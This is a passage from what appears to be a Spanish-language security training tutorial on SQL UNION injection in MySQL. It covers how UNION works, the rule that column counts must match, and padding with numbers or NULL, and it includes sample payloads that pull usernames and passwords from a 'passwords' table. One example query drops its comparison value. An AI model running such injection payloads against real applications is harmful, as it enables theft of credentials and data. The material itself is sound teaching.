Hasta ahora, solo hemos estado manipulando la consulta original para subvertir la lógica de la aplicación web y eludir la autenticación, utilizando el operador `OR` y comentarios. Sin embargo, otro tipo de SQL injection es inyectar consultas SQL completas que se ejecutan junto con la consulta original. Esta sección demostrará esto utilizando la cláusula `UNION` de MySQL para realizar `SQL Union Injection`.

---

## Union

Antes de empezar a aprender sobre Union Injection, primero deberíamos aprender más sobre la cláusula SQL Union. La cláusula [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) se utiliza para combinar resultados de múltiples sentencias `SELECT`. Esto significa que a través de una `UNION` injection, podremos `SELECT` y extraer datos de todo el DBMS, de múltiples tablas y bases de datos. Intentemos usar el operador `UNION` en una base de datos de ejemplo. Primero, veamos el contenido de la tabla `ports`:

```r
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)
```

A continuación, veamos el contenido de la tabla `ships`:

```r
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)
```

Ahora, intentemos usar `UNION` para combinar ambos resultados:

```r
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

Como podemos ver, `UNION` combinó la salida de ambas sentencias `SELECT` en una sola, por lo que las entradas de la tabla `ports` y la tabla `ships` se combinaron en una sola salida con cuatro filas. Algunas de las filas pertenecen a la tabla `ports` mientras que otras pertenecen a la tabla `ships`.

Nota: Los tipos de datos de las columnas seleccionadas en todas las posiciones deben ser los mismos.

---

## Even Columns

Una declaración `UNION` solo puede operar en sentencias `SELECT` con un número igual de columnas. Por ejemplo, si intentamos `UNION` dos consultas que tienen resultados con un número diferente de columnas, obtenemos el siguiente error:

```r
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

La consulta anterior resulta en un error, ya que el primer `SELECT` devuelve una columna y el segundo `SELECT` devuelve dos. Una vez que tengamos dos consultas que devuelvan el mismo número de columnas, podemos usar el operador `UNION` para extraer datos de otras tablas y bases de datos.

Por ejemplo, si la consulta es:

```r
SELECT * FROM products WHERE product_id = 'user_input'
```

Podemos inyectar una consulta `UNION` en la entrada, de modo que se devuelvan filas de otra tabla:

```r
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

La consulta anterior devolvería las entradas `username` y `password` de la tabla `passwords`, asumiendo que la tabla `products` tiene dos columnas.

---

## Un-even Columns

Descubriremos que la consulta original generalmente no tendrá el mismo número de columnas que la consulta SQL que queremos ejecutar, por lo que tendremos que encontrar una solución para eso. Por ejemplo, supongamos que solo teníamos una columna. En ese caso, queremos `SELECT`, podemos poner datos basura para las columnas restantes requeridas para que el número total de columnas que estamos `UNION`ando sea el mismo que la consulta original.

Por ejemplo, podemos usar cualquier cadena como nuestros datos basura, y la consulta devolverá la cadena como su salida para esa columna. Si usamos `UNION` con la cadena `"junk"`, la consulta `SELECT "junk" from passwords`, siempre devolverá `junk`. También podemos usar números. Por ejemplo, la consulta `SELECT 1 from passwords` siempre devolverá `1` como salida.

Nota: Cuando llenamos otras columnas con datos basura, debemos asegurarnos de que el tipo de datos coincida con el tipo de datos de las columnas, de lo contrario, la consulta devolverá un error. Por simplicidad, usaremos números como nuestros datos basura, lo cual también será útil para rastrear las posiciones de nuestros payloads, como discutiremos más adelante.

Consejo: Para SQL injection avanzada, podemos simplemente usar 'NULL' para llenar otras columnas, ya que 'NULL' se ajusta a todos los tipos de datos.

La tabla `products` tiene dos columnas en el ejemplo anterior, por lo que tenemos que `UNION` con dos columnas. Si solo quisiéramos obtener una columna, por ejemplo, `username`, tendríamos que hacer `username, 2`, de manera que tengamos el mismo número de columnas:

```r
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

Si tuviéramos más columnas en la tabla de la consulta original, tendríamos que agregar más números para crear las columnas restantes requeridas. Por ejemplo, si la consulta original usara `SELECT` en una tabla con cuatro columnas, nuestra inyección `UNION` sería:

```r
UNION SELECT username, 2, 3, 4 from passwords-- '
```

Esta consulta devolvería:

```r
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```

Como podemos ver, nuestro resultado deseado de la consulta `UNION SELECT username from passwords` se encuentra en la primera columna de la segunda fila, mientras que los números llenaron las columnas restantes.